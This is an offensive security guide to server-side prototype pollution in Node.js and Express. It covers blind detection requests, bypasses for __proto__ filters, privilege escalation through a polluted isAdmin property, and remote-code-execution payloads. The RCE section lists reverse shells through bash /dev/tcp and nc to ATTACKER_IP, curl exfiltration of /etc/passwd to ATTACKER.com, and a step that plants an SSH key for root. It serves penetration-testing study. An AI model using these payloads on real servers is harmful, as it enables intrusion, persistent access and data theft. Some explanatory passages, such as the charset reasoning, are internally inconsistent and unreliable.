# Server-Side Prototype Pollution

Server-side prototype pollution (SSPP) operates on the same JavaScript inheritance model as client-side pollution, but exploiting it is fundamentally more difficult: there are no browser DevTools, no source code, no ability to inspect objects at runtime, and — critically — no way to reset the Node.js process once polluted. The attacker is essentially making blind, persistent modifications to a live server's memory. This guide covers every non-destructive detection technique and each RCE escalation path in full technical depth. 

**Fundamental principle: Every SSPP detection technique works by polluting a property that controls a known server behaviour, then measuring whether that behaviour changed. The properties used (json spaces, status, content-type) are chosen specifically because they are non-destructive — they alter response formatting or encoding rather than breaking application logic, and the effect can be toggled off by repeating the injection with the original value.**

***

## Why SSPP Is Harder to Detect Than Client-Side

```
─────────────────────────────────────────────────────────────────────────────
CLIENT-SIDE                          SERVER-SIDE
─────────────────────────────────────────────────────────────────────────────
DevTools console available      →    No console access (remote process)
Object.prototype inspectable   →    Prototype invisible from outside
Page refresh = clean state     →    Pollution PERSISTS for Node process lifetime
Source code readable in browser →    No source code (black-box testing)
DOM sinks visible in DOM        →    Sinks are server-side (child_process, etc.)
Accidental DoS → refresh page  →    Accidental DoS → server stays down
─────────────────────────────────────────────────────────────────────────────

Why pollution persists on the server:
  Node.js is a single-process runtime. Object.prototype is global to that
  process and shared across all requests.

  Browser:   each page load → fresh JavaScript execution environment ✓
  Node.js:   process started once → same Object.prototype for ALL requests
             → pollution from request #1 affects request #10,000 ✓
             → no way to undo without restarting the process

Implication for testing:
  → Never pollute with properties that break core application functionality
  → Use only the non-destructive techniques described in this guide
  → If you do break the app: bug bounty programs expect a restart → disclose immediately
```

***

## Detection Method 1: Polluted Property Reflection

```javascript
// ── When it works: server includes the full updated object in the response ─────
// Common endpoints: profile updates, settings saves, JSON PATCH/PUT APIs

// ── Why for...in leaks prototype properties ───────────────────────────────────

const user = { username: "wiener", firstName: "Peter" };
Object.prototype.foo = "bar";        // pollution

user.hasOwnProperty('foo');          // false → not an own property
for (const key in user) {
    console.log(key);                // "username", "firstName", "foo" ← leaked! ✓
}
// for...in iterates OWN + INHERITED enumerable properties
// If server builds a response object using for...in → leaked ✓

// Arrays are also affected:
const arr = ['a', 'b'];
Object.prototype.foo = 'bar';
for (const key in arr) console.log(key);   // 0, 1, "foo" ← indexes + inherited ✓
```

```http
── STEP 1: Baseline request (normal profile update) ──────────────────────────
POST /user/update HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json

{
    "user": "wiener",
    "firstName": "Peter",
    "lastName": "Wiener"
}

── STEP 1 Response (baseline): ───────────────────────────────────────────────
HTTP/1.1 200 OK

{
    "username": "wiener",
    "firstName": "Peter",
    "lastName": "Wiener"
}

── STEP 2: Inject __proto__ with arbitrary property ──────────────────────────
POST /user/update HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json

{
    "user": "wiener",
    "firstName": "Peter",
    "lastName": "Wiener",
    "__proto__": {
        "foo": "bar"
    }
}

── STEP 2 Response (vulnerable server): ──────────────────────────────────────
HTTP/1.1 200 OK

{
    "username": "wiener",
    "firstName": "Peter",
    "lastName": "Wiener",
    "foo": "bar"           ← INJECTED PROPERTY REFLECTED ✓ → SSPP CONFIRMED
}

── STEP 2 Response (secure server): ─────────────────────────────────────────
HTTP/1.1 200 OK

{
    "username": "wiener",
    "firstName": "Peter",
    "lastName": "Wiener"
}                          ← no foo → injection failed or key sanitised

── WHAT THE VULNERABLE SERVER CODE LOOKS LIKE ─────────────────────────────
// Server merges user input directly into user object:
function updateUser(existingUser, updates) {
    for (const key in updates) {           // ← for...in includes __proto__
        existingUser[key] = updates[key];  // ← Object.prototype.foo = "bar"
    }
    return existingUser;
}

// Then serialises the response:
const responseObj = {};
for (const key in updatedUser) {           // ← for...in includes inherited "foo"
    responseObj[key] = updatedUser[key];   // ← "foo": "bar" included in response ✓
}
res.json(responseObj);
```

***

## Detection Method 2: JSON Spaces Override (Blind, Non-Destructive)

```
Why this works:
─────────────────────────────────────────────────────────────────────────────
Express framework internally reads app.get('json spaces') when calling res.json().
The Express code path:

  var spaces = app.get('json spaces');
  // → app.settings['json spaces']
  // → if not set as own property → inherits from Object.prototype ✓
  // → if prototype has 'json spaces': 10 → response indented with 10 spaces

Vulnerable in: Express < 4.17.4
Non-destructive: changing indentation never breaks application logic
Reversible: re-inject with undefined or original value to reset ✓
```

```http
── STEP 1: Baseline — note the current JSON formatting ───────────────────────
POST /user/update HTTP/1.1

{"user":"wiener","firstName":"Peter"}

── STEP 1 Response (normal — no indentation): ────────────────────────────────
HTTP/1.1 200 OK

{"username":"wiener","firstName":"Peter"}
  ↑ compact JSON, no indentation (baseline)

── STEP 2: Inject json spaces pollution ──────────────────────────────────────
POST /user/update HTTP/1.1
Content-Type: application/json

{
    "user": "wiener",
    "firstName": "Peter",
    "__proto__": {
        "json spaces": 10
    }
}

── STEP 2 Response (VULNERABLE — indentation changed): ───────────────────────
HTTP/1.1 200 OK

{
          "username": "wiener",
          "firstName": "Peter"
}
  ↑ 10-space indentation ← Object.prototype['json spaces'] = 10 → SSPP CONFIRMED ✓

NOTE: Always check Burp's RAW tab, not the Pretty tab.
      Pretty view normalises indentation → you won't see the change otherwise.

── STEP 3: Confirm and reset (toggle off to avoid persistence issues) ─────────
POST /user/update HTTP/1.1

{
    "user": "wiener",
    "firstName": "Peter",
    "__proto__": {
        "json spaces": 0
    }
}
── Response: JSON returns to compact form ← confirms the effect was from pollution ✓
```

***

## Detection Method 3: Status Code Override (Blind, Non-Destructive)

```
Why this works:
─────────────────────────────────────────────────────────────────────────────
Node's http-errors module reads the status property from error objects:

  function createError() {
      status = err.status || err.statusCode || status
      if (typeof status !== 'number' ||
          (!statuses.message[status] && (status < 400 || status >= 600))) {
          status = 500
      }
  }

If an error object doesn't have its own status property → inherits from
Object.prototype. If the prototype has been polluted with status: 555,
the error response code becomes 555 instead of the default (400, 404, etc.)

Valid injection range: 400–599 ONLY
  → Below 400 or ≥ 600 → Node defaults to 500 regardless → not reliable
  → Use an obscure code like 555 that is never issued for legitimate reasons
```

```http
── STEP 1: Trigger an error response — note the default status code ───────────
DELETE /user/wiener HTTP/1.1   ← endpoint that returns 400 if request is malformed

── STEP 1 Response (baseline): ───────────────────────────────────────────────
HTTP/1.1 400 Bad Request

{"error": {"success": false, "status": 400, "message": "Invalid request"}}
  ↑ status 400 = baseline

── STEP 2: Pollute the prototype with an obscure status code ─────────────────
POST /user/update HTTP/1.1
Content-Type: application/json

{
    "user": "wiener",
    "firstName": "Peter",
    "__proto__": {
        "status": 555
    }
}

── STEP 3: Retrigger the same error ──────────────────────────────────────────
DELETE /user/wiener HTTP/1.1   ← same malformed request as Step 1

── STEP 3 Response (VULNERABLE): ─────────────────────────────────────────────
HTTP/1.1 555 Unknown
                    ← status changed from 400 → 555 ✓ → SSPP CONFIRMED

── STEP 3 Response (NOT vulnerable): ─────────────────────────────────────────
HTTP/1.1 400 Bad Request
                    ← unchanged → injection did not affect the prototype
```

***

## Detection Method 4: Charset Override (Blind, Non-Destructive)

```
Why this works:
─────────────────────────────────────────────────────────────────────────────
Express's body-parser middleware derives the charset from the request's
Content-Type header via getCharset():

  var charset = getCharset(req) || 'utf-8'

  function getCharset(req) {
      try {
          return (contentType.parse(req).parameters.charset || '').toLowerCase()
      } catch(e) { return undefined }
  }

  read(req, res, next, parse, debug, { encoding: charset, ... })

If the Content-Type has no charset → getCharset() returns '' (empty string)
→ charset = '' || 'utf-8' → BUT '' is falsy → so defaults to 'utf-8'
→ the '' return value means charset is effectively controllable via prototype

Additionally: Node's _addHeaderLine() function in _http_incoming.js:

  function _addHeaderLine(field, value, dest) {
      } else if (dest[field] === undefined) {   // includes INHERITED properties!
          dest[field] = value;
      }
  }
  → If Object.prototype['content-type'] = 'application/json; charset=utf-7'
  → dest['content-type'] === undefined check: inherited value is NOT undefined
  → the real Content-Type header is DROPPED → prototype's value used instead ✓
```

```http
── STEP 1: Establish baseline ────────────────────────────────────────────────
POST /user/update HTTP/1.1
Content-Type: application/json

{
    "sessionId": "0123456789",
    "username": "wiener",
    "role": "+AGYAbwBv-"           ← "foo" encoded in UTF-7
}

── STEP 1 Response (baseline — UTF-7 not decoded): ───────────────────────────
{
    "sessionId": "0123456789",
    "username": "wiener",
    "role": "+AGYAbwBv-"           ← still encoded (server using UTF-8) ✓
}

── STEP 2: Pollute the prototype with UTF-7 charset ─────────────────────────
POST /user/update HTTP/1.1
Content-Type: application/json

{
    "sessionId": "0123456789",
    "username": "wiener",
    "role": "default",
    "__proto__": {
        "content-type": "application/json; charset=utf-7"
    }
}

── STEP 3: Repeat Step 1 ─────────────────────────────────────────────────────
POST /user/update HTTP/1.1
Content-Type: application/json

{
    "sessionId": "0123456789",
    "username": "wiener",
    "role": "+AGYAbwBv-"
}

── STEP 3 Response (VULNERABLE — UTF-7 decoded): ─────────────────────────────
{
    "sessionId": "0123456789",
    "username": "wiener",
    "role": "foo"                   ← +AGYAbwBv- decoded to "foo" ✓ → SSPP CONFIRMED
}
```

***

## Bypassing `__proto__` Filters on the Server

```javascript
// ── Node.js --disable-proto flags ────────────────────────────────────────────
// Some Node deployments use startup flags to disable __proto__:
//   node --disable-proto=delete   → removes __proto__ entirely
//   node --disable-proto=throw    → accessing __proto__ throws a TypeError

// BYPASS: constructor.prototype (does not use __proto__ at all)
{
    "constructor": {
        "prototype": {
            "json spaces": 10
        }
    }
}
// → merge function processes "constructor" key → accesses target.constructor
// → target.constructor = Object (the constructor function)
// → processes "prototype" key → accesses Object.prototype
// → sets Object.prototype["json spaces"] = 10 ✓
// → --disable-proto has NO effect on this path ✓

// ── Single-pass sanitisation bypass (non-recursive strip) ────────────────────
// Filter: key.replace('__proto__', '')  ← replaces only once

// Bypass by embedding:
// __pro__proto__to__   →  after strip: __proto__  ✓
// __pro__proto__to__[json spaces]=10

// In JSON body:
{
    "__pro__proto__to__": {
        "json spaces": 10
    }
}

// For constructor-based filters:
// con__proto__structor[prototype][json spaces]=10
// After strip: constructor[prototype][json spaces]=10 ✓

// ── Filter comparison of all bypass vectors ───────────────────────────────────
//
// Vector               Blocked by          Blocked by           Blocked by
//                      __proto__ filter    constructor filter    both filters
// ─────────────────────────────────────────────────────────────────────────────
// __proto__[x]         ✓ (blocked)         ✗ (passes)           ✓
// constructor.proto.x  ✗ (passes)          ✓ (blocked)          ✓
// __pro__proto__to__   ✗ (passes)          ✗ (passes)           ✗ ← wins ✓
// con__proto__structor ✗ (passes)          ✗ (passes)           ✗ ← wins ✓
```

***

## Escalation: Privilege Escalation via Polluted Properties

```http
── SCENARIO: User update endpoint merges input into user object ───────────────
── Server checks user.isAdmin to determine admin access ──────────────────────

── STEP 1: Test normal property reflection ───────────────────────────────────
POST /user/update HTTP/1.1
Content-Type: application/json

{
    "user": "wiener",
    "__proto__": {
        "isAdmin": true
    }
}

── Response (vulnerable): ────────────────────────────────────────────────────
{
    "user": "wiener",
    "isAdmin": true              ← reflected ✓ → prototype polluted

── STEP 2: Access admin functionality ────────────────────────────────────────
GET /admin HTTP/1.1
Cookie: session=wiener-session-token

── Response: ─────────────────────────────────────────────────────────────────
HTTP/1.1 200 OK                  ← admin access granted ✓

── WHY THIS WORKS: server-side access control check ──────────────────────────
// Server code:
function checkAdmin(user) {
    if (user.isAdmin) {           // ← user doesn't have own isAdmin = true
        grantAdminAccess();       //   but inherits it from polluted Object.prototype
    }                             //   → isAdmin === true → access granted ✓
}
// user object was created AFTER pollution → inherits Object.prototype.isAdmin ✓
```

***

## Escalation: Remote Code Execution

### RCE Path 1: `child_process.fork()` via `execArgv`

```javascript
// ── HOW fork() IS NORMALLY CALLED ────────────────────────────────────────────
const { fork } = require('child_process');
const options = {};                           // ← no execArgv set
const child = fork('worker.js', [], options);
// options.execArgv is undefined → inheritable from prototype ✓

// ── POLLUTION PAYLOAD ─────────────────────────────────────────────────────────
// Inject via JSON body or any SSPP source:
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('id > /tmp/pwned')"
        ]
    }
}

// When fork() is next called:
// options.execArgv → undefined on options → inherits from Object.prototype
// → Object.prototype.execArgv = ["--eval=require('child_process').execSync('id > /tmp/pwned')"]
// → fork('worker.js', [], { execArgv: ["--eval=..."] })
// → spawned Node process runs: --eval=require('child_process').execSync('id > /tmp/pwned')
// → execSync('id > /tmp/pwned') → OS command executes ✓

// ── USEFUL execArgv PAYLOADS ──────────────────────────────────────────────────

// Confirm RCE (Burp Collaborator DNS callback):
"execArgv": ["--eval=require('child_process').execSync('nslookup YOUR-COLLABORATOR.oastify.com')"]

// Reverse shell:
"execArgv": [
    "--eval=require('child_process').execSync('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
]

// Exfiltrate /etc/passwd:
"execArgv": [
    "--eval=require('child_process').execSync('curl https://ATTACKER.com/?d=$(cat /etc/passwd | base64 -w 0)')"
]

// Write SSH key:
"execArgv": [
    "--eval=require('child_process').execSync('mkdir -p /root/.ssh && echo SSH_PUB_KEY >> /root/.ssh/authorized_keys')"
]

// Upgrade to interactive reverse shell:
"execArgv": [
    "--eval=require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f')"
]
```

### RCE Path 2: `NODE_OPTIONS` + `child_process.spawn()` (Blind Detection)

```javascript
// ── IDENTIFYING WHETHER fork()/spawn() IS CALLED ASYNCHRONOUSLY ─────────────
// Some endpoints trigger child process creation not immediately, but:
//   → On background job execution (cron, worker queue)
//   → On specific application events (export, report generation, email sending)
// → Use Burp Collaborator to detect these without seeing direct output

// PAYLOAD: Inject NODE_OPTIONS to trigger DNS callback when any child process starts
{
    "__proto__": {
        "shell": "node",
        "NODE_OPTIONS": "--inspect=YOUR-COLLAB-ID.oastify.com\"\".oastify\"\".com"
    }
}

// When spawn()/fork() is called with options that inherit from prototype:
// → NODE_OPTIONS env var passed to child → child starts with --inspect flag
// → --inspect causes a DNS lookup to the specified host
// → Burp Collaborator receives the DNS request ✓
// → Confirms that: (a) SSPP works, (b) child processes are spawned ✓

// The escaped quotes (\"\") in the Collaborator domain are a Node.js quirk:
// → Prevent the URL from being parsed as a full WebSocket endpoint
// → The DNS lookup still fires even with the escaped quotes ✓

// ── ESCALATING FROM DETECTION TO RCE ─────────────────────────────────────────
// NODE_OPTIONS supports --require, which loads a module before execution:
{
    "__proto__": {
        "shell": "node",
        "NODE_OPTIONS": "--require /proc/self/environ"
    },
    "env": {
        "EVIL": "require('child_process').execSync('id').toString()//"
    }
}
// → /proc/self/environ contains env vars as KEY=VALUE pairs
// → Node --requires it → tries to execute it as JS
// → EVIL env var contains JS code → executes → RCE ✓ [web:271]
```

### RCE Path 3: `child_process.execSync()` via `shell` + `input`

```javascript
// ── HOW execSync() IS VULNERABLE ─────────────────────────────────────────────
// When application calls: execSync('someCommand', options)
// options.shell  → which shell to run the command in (default: /bin/sh)
// options.input  → string piped to the child process's STDIN

// If neither shell nor input are set on options: inheritable from prototype ✓

// PAYLOAD: Override both shell and input
{
    "__proto__": {
        "shell": "vim",
        "input": ":! curl https://ATTACKER.com/?d=$(id)\n"
    }
}

// What happens:
// 1. App calls: execSync('normalCommand', options)
// 2. options.shell → undefined → inherits "vim" from prototype
// 3. options.input → undefined → inherits ":! curl..." from prototype
// 4. execSync runs: vim -c ':! curl...' → actually passes input via stdin
// 5. vim receives ':! curl...' on stdin → executes as vim command
// 6. ':! command' in vim → executes shell command → curl fires → RCE ✓
// 7. \n at end simulates pressing Enter in vim's interactive prompt ✓

// ── WHY VIM (and ex) ARE USED SPECIFICALLY ───────────────────────────────────
// The shell option can ONLY be the executable name — no additional arguments
// The shell is always run with -c flag by Node → this conflicts with bash/sh
// Vim and ex satisfy all constraints:
//   ✓ Accept a name without arguments
//   ✓ Accept commands from stdin when piped
//   ✓ Support :! to execute OS commands
//   ✓ Likely installed on Linux servers
//   ✓ The \n simulates Enter to confirm command execution

// ── ALTERNATE shells that accept stdin commands ───────────────────────────────
// ex (vi editor in line mode):
"shell": "ex",
"input": ":! id\n:q\n"

// Python (via stdin):
"shell": "python3",
"input": "import os; os.system('id')\n"

// Node (if allowed — with the -c caveat workaround):
// Node's -c flag runs syntax check, NOT execution
// → Node itself as shell is generally not viable ✓

// ── EXFILTRATION USING STDIN-ONLY TOOLS ──────────────────────────────────────
// curl with -d @- reads POST body from stdin:
"shell": "vim",
"input": ":! cat /etc/passwd | curl -d @- https://ATTACKER.com/exfil\n"

// xargs converts stdin lines to arguments:
"shell": "vim",
"input": ":! cat /etc/passwd | xargs -I{} curl https://ATTACKER.com/?d={}\n"
```
